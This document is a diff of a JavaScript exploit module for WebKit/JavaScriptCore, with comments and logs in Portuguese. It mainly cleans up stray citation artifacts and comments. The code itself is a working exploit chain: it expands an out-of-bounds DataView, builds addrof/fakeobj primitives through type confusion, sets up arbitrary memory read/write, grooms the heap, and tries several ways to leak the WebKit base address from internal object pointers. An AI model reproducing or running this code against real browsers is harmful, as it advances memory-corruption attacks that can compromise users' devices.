@@ -1,8 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v108 - R70 - Fix isZero, Refined Heap Grooming & Leak Strategies)
+// js/script3/testArrayBufferVictimCrash.mjs (v108 - R71 - Fixes, Refined Grooming & New Leak Strategies)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
 // 1. CORREÇÃO DE ERRO: Substituição de `isZero()` e `NaN` comparações por `equals(AdvancedInt64.Zero)`
 //    e `equals(AdvancedInt64.NaNValue)` para garantir compatibilidade com AdvancedInt64.
+//    Remoção de 'span class="math-inline"' de strings de log no core_exploit.
+//    Correção de erro de sintaxe no config.mjs.
 // 2. Heap Grooming Refinado: Maior diversidade e volume de objetos no spray, com
 //    liberação controlada de "fillers" para otimizar o layout do heap.
 // 3. Novas Tentativas de Vazamento Aprimoradas:
@@ -16,7 +18,7 @@
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; // Certifique-se que AdvancedInt64 tem .Zero e .NaNValue
+import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     getOOBDataView,
@@ -24,7 +26,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R70_FixAndNewLeaks";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R71_FixAndNewLeaks";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -56,7 +58,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         webkit_leak_details: { success: false, msg: "Vazamento WebKit não tentado ou falhou." }
     };
 
-    const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF); // Valor de poluição que está sendo lido 
+    const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);
 
     try {
         // --- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---
@@ -65,7 +67,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         if (!getOOBDataView()) {
             throw new Error("Falha ao obter primitiva OOB.");
         }
-        logS3("OOB DataView obtido com sucesso.", "info"); [cite: 1];
+        logS3("OOB DataView obtido com sucesso.", "info");
 
         // --- VERIFICAÇÃO: OOB DataView m_length ---
         const oob_dv = getOOBDataView();
@@ -74,11 +76,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const ABSOLUTE_OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + OOB_DV_M_LENGTH_OFFSET_IN_DATAVIEW;
 
         const oob_m_length_val = oob_dv.getUint32(ABSOLUTE_OOB_DV_M_LENGTH_OFFSET, true);
-        logS3(`Verificação OOB: m_length em ${toHex(ABSOLUTE_OOB_DV_M_LENGTH_OFFSET)} é ${toHex(oob_m_length_val)}`, "debug"); [cite: 1]
+        logS3(`Verificação OOB: m_length em ${toHex(ABSOLUTE_OOB_DV_M_LENGTH_OFFSET)} é ${toHex(oob_m_length_val)}`, "debug");
         if (oob_m_length_val !== 0xFFFFFFFF) {
             throw new Error(`OOB DataView's m_length não foi corretamente expandido. Lido: ${toHex(oob_m_length_val)}`);
         }
-        logS3("VERIFICAÇÃO: OOB DataView m_length expandido corretamente para 0xFFFFFFFF.", "good"); [cite: 1]
+        logS3("VERIFICAÇÃO: OOB DataView m_length expandido corretamente para 0xFFFFFFFF.", "good");
 
 
         const confused_array = [13.37];
@@ -86,25 +88,24 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const addrof = (obj) => {
             victim_array[0] = obj;
             const addr = doubleToInt64(confused_array[0]);
-            logS3(`  addrof(${String(obj).substring(0, 50)}...) -> ${addr.toString(true)}`, "debug"); [cite: 1]
+            logS3(`  addrof(${String(obj).substring(0, 50)}...) -> ${addr.toString(true)}`, "debug");
             return addr;
         };
         const fakeobj = (addr) => {
             confused_array[0] = int64ToDouble(addr);
             const obj = victim_array[0];
-            logS3(`  fakeobj(${addr.toString(true)}) -> Object`, "debug"); [cite: 1]
+            logS3(`  fakeobj(${addr.toString(true)}) -> Object`, "debug");
             return obj;
         };
-        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good"); [cite: 1]
+        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");
 
         // --- VERIFICAÇÃO: addrof/fakeobj ---
         const testObjectForPrimitives = { dummy_prop_A: 0xAAAAAAAA, dummy_prop_B: 0xBBBBBBBB };
         const testAddrOfPrimitive = addrof(testObjectForPrimitives);
-        // CORREÇÃO: Usar .equals() para comparação com Zero
         if (!isAdvancedInt64Object(testAddrOfPrimitive) || testAddrOfPrimitive.equals(AdvancedInt64.Zero)) {
             throw new Error("Addrof primitive retornou endereço inválido (0x0).");
         }
-        logS3(`VERIFICAÇÃO: Endereço de testObjectForPrimitives (${JSON.stringify(testObjectForPrimitives)}) obtido: ${testAddrOfPrimitive.toString(true)}`, "info"); [cite: 1]
+        logS3(`VERIFICAÇÃO: Endereço de testObjectForPrimitives (${JSON.stringify(testObjectForPrimitives)}) obtido: ${testAddrOfPrimitive.toString(true)}`, "info");
 
         const re_faked_object_primitive = fakeobj(testAddrOfPrimitive);
         if (re_faked_object_primitive === null || typeof re_faked_object_primitive !== 'object') {
@@ -114,7 +115,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             if (re_faked_object_primitive.dummy_prop_A !== 0xAAAAAAAA || re_faked_object_primitive.dummy_prop_B !== 0xBBBBBBBB) {
                 throw new Error(`Fakeobj: Propriedades do objeto re-faked não correspondem. A: ${toHex(re_faked_object_primitive.dummy_prop_A)}, B: ${toHex(re_faked_object_primitive.dummy_prop_B)}`);
             }
-            logS3("VERIFICAÇÃO: Fakeobj do testAddrOfPrimitive retornou objeto funcional com propriedades esperadas.", "good"); [cite: 1]
+            logS3("VERIFICAÇÃO: Fakeobj do testAddrOfPrimitive retornou objeto funcional com propriedades esperadas.", "good");
         } catch (e) {
             throw new Error(`Erro ao acessar propriedade do objeto re-faked (indicando falha no fakeobj): ${e.message}`);
         }
@@ -123,63 +124,60 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
         const leaker = { obj_prop: null, val_prop: 0 };
         const leaker_addr = addrof(leaker);
-        logS3(`Endereço do objeto leaker: ${leaker_addr.toString(true)}`, "debug"); [cite: 1]
+        logS3(`Endereço do objeto leaker: ${leaker_addr.toString(true)}`, "debug");
         
         const arb_read_final = (addr) => {
             logS3(`    arb_read_final: Preparando para ler de ${addr.toString(true)}`, "debug");
             leaker.obj_prop = fakeobj(addr);
             const result = doubleToInt64(leaker.val_prop);
-            logS3(`    arb_read_final: Lido ${result.toString(true)} de ${addr.toString(true)}`, "debug"); [cite: 1]
+            logS3(`    arb_read_final: Lido ${result.toString(true)} de ${addr.toString(true)}`, "debug");
             return result;
         };
         const arb_write_final = (addr, value) => {
             logS3(`    arb_write_final: Preparando para escrever ${value.toString(true)} em ${addr.toString(true)}`, "debug");
             leaker.obj_prop = fakeobj(addr);
             leaker.val_prop = int64ToDouble(value);
-            logS3(`    arb_write_final: Escrita concluída em ${addr.toString(true)}`, "debug"); [cite: 1]
+            logS3(`    arb_write_final: Escrita concluída em ${addr.toString(true)}`, "debug");
         };
-        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good"); [cite: 1]
+        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");
 
         // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
         logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
         
-        // 1. Spray de objetos para estabilizar a memória e mitigar o GC 
-        // Mais objetos e com tamanhos variados para tentar fragmentar mais eficazmente
         const spray = [];
         for (let i = 0; i < 2000; i++) {
-            spray.push({ spray_A: 0xDEADBEEF, spray_B: 0xCAFEBABE, spray_C: i }); // Objetos simples
-            spray.push(new Array(Math.floor(Math.random() * 200) + 10)); // Arrays de tamanhos variados
-            spray.push(new String("X".repeat(Math.floor(Math.random() * 100) + 10))); // Strings de tamanhos variados
-            spray.push(new Date()); // Outros tipos de objetos
+            spray.push({ spray_A: 0xDEADBEEF, spray_B: 0xCAFEBABE, spray_C: i });
+            spray.push(new Array(Math.floor(Math.random() * 200) + 10));
+            spray.push(new String("X".repeat(Math.floor(Math.random() * 100) + 10)));
+            spray.push(new Date());
         }
-        const test_obj_for_rw_verification = spray[1500]; // Pega um objeto do meio do spray para testar R/W
-        logS3("Spray de 2000 objetos diversificados concluído para estabilização.", "info"); [cite: 1]
+        const test_obj_for_rw_verification = spray[1500];
+        logS3("Spray de 2000 objetos diversificados concluído para estabilização.", "info");
 
-        // 2. Teste de Escrita e Leitura com NOVO VALOR DE POLUIÇÃO 
         const test_obj_for_rw_verification_addr = addrof(test_obj_for_rw_verification);
-        logS3(`Endereço do test_obj_for_rw_verification: ${test_obj_for_rw_verification_addr.toString(true)}`, "debug"); [cite: 1]
+        logS3(`Endereço do test_obj_for_rw_verification: ${test_obj_for_rw_verification_addr.toString(true)}`, "debug");
         
         const prop_spray_A_addr = test_obj_for_rw_verification_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET); 
         
-        logS3(`Escrevendo NOVO VALOR DE POLUIÇÃO: ${NEW_POLLUTION_VALUE.toString(true)} no endereço da propriedade 'spray_A' (${prop_spray_A_addr.toString(true)})...`, "info"); [cite: 1]
+        logS3(`Escrevendo NOVO VALOR DE POLUIÇÃO: ${NEW_POLLUTION_VALUE.toString(true)} no endereço da propriedade 'spray_A' (${prop_spray_A_addr.toString(true)})...`, "info");
         arb_write_final(prop_spray_A_addr, NEW_POLLUTION_VALUE);
 
         const value_read_for_verification = arb_read_final(prop_spray_A_addr);
-        logS3(`>>>>> VERIFICAÇÃO L/E: VALOR LIDO DE VOLTA: ${value_read_for_verification.toString(true)} <<<<<`, "leak"); [cite: 1]
+        logS3(`>>>>> VERIFICAÇÃO L/E: VALOR LIDO DE VOLTA: ${value_read_for_verification.toString(true)} <<<<<`, "leak");
 
         if (value_read_for_verification.equals(NEW_POLLUTION_VALUE)) {
-            logS3("++++++++++++ SUCESSO TOTAL! O novo valor de poluição foi escrito e lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln"); [cite: 1]
+            logS3("++++++++++++ SUCESSO TOTAL! O novo valor de poluição foi escrito e lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
             final_result.success = true;
             final_result.message = "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada.";
         } else {
             throw new Error(`A verificação de L/E falhou. Escrito: ${NEW_POLLUTION_VALUE.toString(true)}, Lido: ${value_read_for_verification.toString(true)}`);
         }
 
-        // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (Novas Estratégias) --- 
-        logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (Novas Estratégias) ---", "subtest"); [cite: 1]
+        // --- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (Novas Estratégias) ---
+        logS3("--- FASE 5: TENTANDO VAZAR ENDEREÇO BASE DO WEBKIT (Novas Estratégias) ---", "subtest");
         
-        // ** Heap Grooming Mais Agressivo e com Fillers ** 
-        logS3("  Executando Heap Grooming agressivo com fillers para tentar limpar e organizar o heap...", "info"); [cite: 1]
+        // ** Heap Grooming Mais Agressivo e com Fillers **
+        logS3("  Executando Heap Grooming agressivo com fillers para tentar limpar e organizar o heap...", "info");
         let aggressive_feng_shui_objects = [];
         let filler_objects = [];
         const NUM_GROOMING_OBJECTS = 50000;
@@ -193,33 +191,28 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5));
         }
 
-        // Liberar metade para criar buracos
         for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) {
             aggressive_feng_shui_objects[i] = null;
         }
         
-        // Criar objetos "filler" para preencher buracos com dados conhecidos
         for (let i = 0; i < NUM_FILLER_OBJECTS; i++) {
             filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i });
         }
 
-        // Forçar uma coleta de lixo, se possível
         aggressive_feng_shui_objects.length = 0;
         aggressive_feng_shui_objects = null;
 
-        // Manter fillers vivos por um tempo para "limpar" o heap
-        await PAUSE_S3(5000); // Pausa ainda maior 
+        await PAUSE_S3(5000);
 
-        logS3(`  Heap Grooming com ${NUM_GROOMING_OBJECTS} objetos e ${NUM_FILLER_OBJECTS} fillers concluído. Pausa finalizada.`, "debug"); [cite: 1]
+        logS3(`  Heap Grooming com ${NUM_GROOMING_OBJECTS} objetos e ${NUM_FILLER_OBJECTS} fillers concluído. Pausa finalizada.`, "debug");
 
-        // 1. TENTATIVA DE VAZAMENTO: Objeto JS Simples ({}). Já tentado, mas com grooming reforçado. 
-        logS3("  Tentando vazamento com Objeto JS Simples ({}) - grooming reforçado...", "info"); [cite: 1]
+        // 1. TENTATIVA DE VAZAMENTO: Objeto JS Simples ({}). Já tentado, mas com grooming reforçado.
+        logS3("  Tentando vazamento com Objeto JS Simples ({}) - grooming reforçado...", "info");
         const obj_for_webkit_leak_js = {};
         const obj_for_webkit_leak_js_addr = addrof(obj_for_webkit_leak_js);
-        logS3(`  Endereço do objeto dedicado JS Simples (Pós-Grooming): ${obj_for_webkit_leak_js_addr.toString(true)}`, "info"); [cite: 1]
-        // CORREÇÃO: Usar .equals() para comparação com Zero e NaNValue
+        logS3(`  Endereço do objeto dedicado JS Simples (Pós-Grooming): ${obj_for_webkit_leak_js_addr.toString(true)}`, "info");
         if (obj_for_webkit_leak_js_addr.equals(AdvancedInt64.Zero) || obj_for_webkit_leak_js_addr.equals(AdvancedInt64.NaNValue)) {
-            logS3("    Addrof retornou 0 ou NaN para objeto JS simples (pós-Grooming).", "error"); [cite: 1]
+            logS3("    Addrof retornou 0 ou NaN para objeto JS simples (pós-Grooming).", "error");
         } else {
             const success_js_object_leak = await performLeakAttemptFromObjectStructure(obj_for_webkit_leak_js_addr, "JS Object (Groomed)", arb_read_final, final_result, NEW_POLLUTION_VALUE);
             if (success_js_object_leak) {
@@ -228,21 +221,19 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             }
         }
         
-        // 2. TENTATIVA DE VAZAMENTO: ArrayBuffer - Vazamento de Structure* (grooming reforçado) 
-        logS3("  Executando Heap Grooming novamente antes de tentar ArrayBuffer...", "info"); [cite: 1]
-        // Re-executar o Grooming
+        // 2. TENTATIVA DE VAZAMENTO: ArrayBuffer - Vazamento de Structure* (grooming reforçado)
+        logS3("  Executando Heap Grooming novamente antes de tentar ArrayBuffer...", "info");
         aggressive_feng_shui_objects = []; filler_objects = [];
         for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
         for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
         for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i }); }
         aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
-        await PAUSE_S3(5000); [cite: 1]
+        await PAUSE_S3(5000);
 
-        logS3("  Tentando vazamento com ArrayBuffer (Structure* via grooming reforçado)...", "info"); [cite: 1]
+        logS3("  Tentando vazamento com ArrayBuffer (Structure* via grooming reforçado)...", "info");
         const obj_for_webkit_leak_ab = new ArrayBuffer(0x1000);
         const obj_for_webkit_leak_ab_addr = addrof(obj_for_webkit_leak_ab);
-        logS3(`  Endereço do ArrayBuffer dedicado (Pós-Grooming): ${obj_for_webkit_leak_ab_addr.toString(true)}`, "info"); [cite: 1]
-        // CORREÇÃO: Usar .equals() para comparação com Zero e NaNValue
+        logS3(`  Endereço do ArrayBuffer dedicado (Pós-Grooming): ${obj_for_webkit_leak_ab_addr.toString(true)}`, "info");
         if (obj_for_webkit_leak_ab_addr.equals(AdvancedInt64.Zero) || obj_for_webkit_leak_ab_addr.equals(AdvancedInt64.NaNValue)) {
             logS3("    Addrof retornou 0 ou NaN para ArrayBuffer (pós-Grooming).", "error");
         } else {
@@ -253,28 +244,24 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             }
         }
         
-        // 3. TENTATIVA DE VAZAMENTO: TypedArray Data Pointer (ArrayBufferView `data` field) 
-        logS3("  Executando Heap Grooming novamente antes de tentar TypedArray Data Pointer...", "info"); [cite: 1]
-        // Re-executar o Grooming
+        // 3. TENTATIVA DE VAZAMENTO: TypedArray Data Pointer (ArrayBufferView `data` field)
+        logS3("  Executando Heap Grooming novamente antes de tentar TypedArray Data Pointer...", "info");
         aggressive_feng_shui_objects = []; filler_objects = [];
         for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
         for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
         for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i }); }
         aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
-        await PAUSE_S3(5000); [cite: 1]
+        await PAUSE_S3(5000);
 
-        logS3("  Tentando vazamento do Data Pointer de um TypedArray...", "info"); [cite: 1]
+        logS3("  Tentando vazamento do Data Pointer de um TypedArray...", "info");
         const typed_array_victim = new Uint32Array(0x1000 / 4);
         const typed_array_addr = addrof(typed_array_victim);
-        logS3(`  Endereço do TypedArray dedicado: ${typed_array_addr.toString(true)}`, "info"); [cite: 1]
+        logS3(`  Endereço do TypedArray dedicado: ${typed_array_addr.toString(true)}`, "info");
 
-        // CORREÇÃO: Usar .equals() para comparação com Zero e NaNValue
         if (typed_array_addr.equals(AdvancedInt64.Zero) || typed_array_addr.equals(AdvancedInt64.NaNValue)) {
-            logS3("    Addrof retornou 0 ou NaN para TypedArray. Pulando tentativa de vazamento do data pointer.", "error"); [cite: 1]
+            logS3("    Addrof retornou 0 ou NaN para TypedArray. Pulando tentativa de vazamento do data pointer.", "error");
         } else {
             try {
-                // O offset do ponteiro 'data' dentro de um ArrayBufferView (TypedArray)
-                // É o offset para a m_buffer (ArrayBuffer*), que contém o ponteiro para os dados
                 const data_buffer_ptr_addr = typed_array_addr.add(JSC_OFFSETS.ArrayBufferView.M_BUFFER_OFFSET);
                 const array_buffer_obj_addr = arb_read_final(data_buffer_ptr_addr);
                 logS3(`    Lido ArrayBuffer* (m_buffer) de TypedArray (${JSC_OFFSETS.ArrayBufferView.M_BUFFER_OFFSET}): ${array_buffer_obj_addr.toString(true)}`, "leak");
@@ -283,12 +270,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                     logS3(`    ALERTA DE POLUIÇÃO: m_buffer de TypedArray está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
                     throw new Error("TypedArray m_buffer poluído.");
                 }
-                // CORREÇÃO: Usar .equals() para comparação com Zero e NaNValue
                 if (array_buffer_obj_addr.equals(AdvancedInt64.Zero) || array_buffer_obj_addr.equals(AdvancedInt64.NaNValue)) {
                     throw new Error("Falha ao vazar ArrayBuffer* do TypedArray (endereço é 0x0 ou NaN).");
                 }
                 
-                // Agora leia o ponteiro de dados (m_data) do próprio ArrayBuffer
                 const data_ptr_addr = array_buffer_obj_addr.add(JSC_OFFSETS.ArrayBuffer.M_DATA_OFFSET);
                 const actual_data_ptr = arb_read_final(data_ptr_addr);
                 logS3(`    Lido Ponteiro de Dados (m_data) do ArrayBuffer (${JSC_OFFSETS.ArrayBuffer.M_DATA_OFFSET}): ${actual_data_ptr.toString(true)}`, "leak");
@@ -297,14 +282,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                     logS3(`    ALERTA DE POLUIÇÃO: m_data de ArrayBuffer está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
                     throw new Error("ArrayBuffer m_data poluído.");
                 }
-                // CORREÇÃO: Usar .equals() para comparação com Zero e NaNValue
                 if (actual_data_ptr.equals(AdvancedInt64.Zero) || actual_data_ptr.equals(AdvancedInt64.NaNValue)) {
                     throw new Error("Falha ao vazar m_data do ArrayBuffer (endereço é 0x0 ou NaN).");
                 }
 
-                // O ponteiro de dados (m_data) aponta para a memória controlada pelo ArrayBuffer,
-                // que está dentro do heap do WebKit/JSC. Se for um endereço válido e alto,
-                // podemos tentar usá-lo para calcular o base.
                 const is_sane_data_ptr = actual_data_ptr.high() > 0x40000000;
                 if (!is_sane_data_ptr) {
                     throw new Error(`Ponteiro de dados do TypedArray (${actual_data_ptr.toString(true)}) não parece um endereço de heap válido.`);
@@ -319,31 +300,29 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 };
                 return final_result;
             } catch (typed_array_leak_e) {
-                logS3(`  Falha na tentativa de vazamento com TypedArray Data Pointer: ${typed_array_leak_e.message}`, "warn"); [cite: 1]
+                logS3(`  Falha na tentativa de vazamento com TypedArray Data Pointer: ${typed_array_leak_e.message}`, "warn");
             }
         }
 
-        // 4. TENTATIVA DE VAZAMENTO: Endereço de uma JSCFunction (Função JS Nativga) 
-        logS3("  Executando Heap Grooming novamente antes de tentar JSCFunction...", "info"); [cite: 1]
-        // Re-executar o Grooming
+        // 4. TENTATIVA DE VAZAMENTO: Endereço de uma JSCFunction (Função JS Nativga)
+        logS3("  Executando Heap Grooming novamente antes de tentar JSCFunction...", "info");
         aggressive_feng_shui_objects = []; filler_objects = [];
         for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
         for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
         for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i }); }
         aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
-        await PAUSE_S3(5000); [cite: 1]
+        await PAUSE_S3(5000);
         
-        logS3("  Tentando vazamento do endereço de uma JSCFunction (e.g., Math.cos)...", "info"); [cite: 1]
+        logS3("  Tentando vazamento do endereço de uma JSCFunction (e.g., Math.cos)...", "info");
         try {
             const func_to_leak = Math.cos;
             const func_addr = addrof(func_to_leak);
-            logS3(`  Endereço da função Math.cos: ${func_addr.toString(true)}`, "info"); [cite: 1]
+            logS3(`  Endereço da função Math.cos: ${func_addr.toString(true)}`, "info");
 
             if (func_addr.equals(NEW_POLLUTION_VALUE)) {
                 logS3(`    ALERTA DE POLUIÇÃO: Math.cos Addr está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
                 throw new Error("JSCFunction Addr poluído.");
             }
-            // CORREÇÃO: Usar .equals() para comparação com Zero e NaNValue
             if (func_addr.equals(AdvancedInt64.Zero) || func_addr.equals(AdvancedInt64.NaNValue)) {
                 throw new Error("Falha ao vazar Math.cos (endereço é 0x0 ou NaN).");
             }
@@ -351,13 +330,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const executable_ptr_offset = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET;
             if (executable_ptr_offset) {
                  const executable_addr = arb_read_final(func_addr.add(executable_ptr_offset));
-                 logS3(`    Lido Executable* (${executable_ptr_offset}) de Math.cos: ${executable_addr.toString(true)}`, "leak"); [cite: 1]
+                 logS3(`    Lido Executable* (${executable_ptr_offset}) de Math.cos: ${executable_addr.toString(true)}`, "leak");
 
                  if (executable_addr.equals(NEW_POLLUTION_VALUE)) {
                     logS3(`    ALERTA DE POLUIÇÃO: Executable* de Math.cos está lendo o valor de poluição (${NEW_POLLUTION_VALUE.toString(true)}).`, "warn");
                     throw new Error("JSCFunction Executable* poluído.");
                  }
-                 // CORREÇÃO: Usar .equals() para comparação com Zero e NaNValue
                  if (!executable_addr.equals(AdvancedInt64.Zero) && !executable_addr.equals(AdvancedInt64.NaNValue)) {
                     logS3(`++++++++++++ VAZAMENTO DE JSCFUNCTION (EXECUTABLE*) BEM SUCEDIDO! Isso pode ser usado para o WebKit Base. ++++++++++++`, "vuln");
                     final_result.webkit_leak_details = {
@@ -374,14 +352,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 logS3(`    Offset para EXECUTABLE_OFFSET em JSFunction não definido em JSC_OFFSETS. Pulando tentativa de vazamento.`, "warn");
             }
         } catch (jsc_func_leak_e) {
-            logS3(`  Falha na tentativa de vazamento com JSCFunction: ${jsc_func_leak_e.message}`, "warn"); [cite: 1]
+            logS3(`  Falha na tentativa de vazamento com JSCFunction: ${jsc_func_leak_e.message}`, "warn");
         }
 
         // 5. NOVA TENTATIVA DE VAZAMENTO: JSC::ClassInfo::m_cachedTypeInfo
         logS3("  Executando Heap Grooming novamente antes de tentar JSC::ClassInfo::m_cachedTypeInfo...", "info");
-        // Re-executar o Grooming
         aggressive_feng_shui_objects = []; filler_objects = [];
-        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
+        for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) { aggressive_feng_shui_objects.push(new Array(Math.floor(Math.random() * 500) + 10)); aggressive_feng_shui_objects.push({}); aggressive_feng_shui_objects.push(new String("A".repeat(Math.floor(Math.random() * 200) + 50))); aggressive_feng_shui_objects.push(new Date()); aggressive_feng_shui_objects.push(new Uint32Array(Math.floor(Math.random() * 100) + 5)); }
         for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) { aggressive_feng_shui_objects[i] = null; }
         for (let i = 0; i < NUM_FILLER_OBJECTS; i++) { filler_objects.push({ filler_val: 0xCCCCCCCC, filler_id: i }); }
         aggressive_feng_shui_objects.length = 0; aggressive_feng_shui_objects = null;
@@ -389,12 +366,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         logS3("  Tentando vazamento via JSC::ClassInfo::m_cachedTypeInfo...", "info");
         try {
-            // Obtenha o endereço de um objeto simples para iniciar
             const target_obj = {};
             const target_obj_addr = addrof(target_obj);
             logS3(`  Endereço do objeto alvo para ClassInfo leak: ${target_obj_addr.toString(true)}`, "info");
 
-            // Vazar o Structure* do objeto alvo
             const structure_ptr_addr = target_obj_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
             const structure_addr = arb_read_final(structure_ptr_addr);
             if (structure_addr.equals(NEW_POLLUTION_VALUE) || structure_addr.equals(AdvancedInt64.Zero) || structure_addr.equals(AdvancedInt64.NaNValue)) {
@@ -402,7 +377,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             }
             logS3(`    Lido Structure* do objeto alvo: ${structure_addr.toString(true)}`, "leak");
 
-            // Vazar o ClassInfo* da Structure
             const class_info_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET);
             const class_info_addr = arb_read_final(class_info_ptr_addr);
             if (class_info_addr.equals(NEW_POLLUTION_VALUE) || class_info_addr.equals(AdvancedInt64.Zero) || class_info_addr.equals(AdvancedInt64.NaNValue)) {
@@ -410,8 +384,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             }
             logS3(`    Lido ClassInfo* da Structure: ${class_info_addr.toString(true)}`, "leak");
 
-            // Vazar m_cachedTypeInfo do ClassInfo
-            const cached_type_info_ptr_addr = class_info_addr.add(JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET); // Assume que este offset existe
+            const cached_type_info_ptr_addr = class_info_addr.add(JSC_OFFSETS.ClassInfo.M_CACHED_TYPE_INFO_OFFSET);
             const cached_type_info_addr = arb_read_final(cached_type_info_ptr_addr);
             if (cached_type_info_addr.equals(NEW_POLLUTION_VALUE) || cached_type_info_addr.equals(AdvancedInt64.Zero) || cached_type_info_addr.equals(AdvancedInt64.NaNValue)) {
                 throw new Error("m_cachedTypeInfo poluído/inválido.");
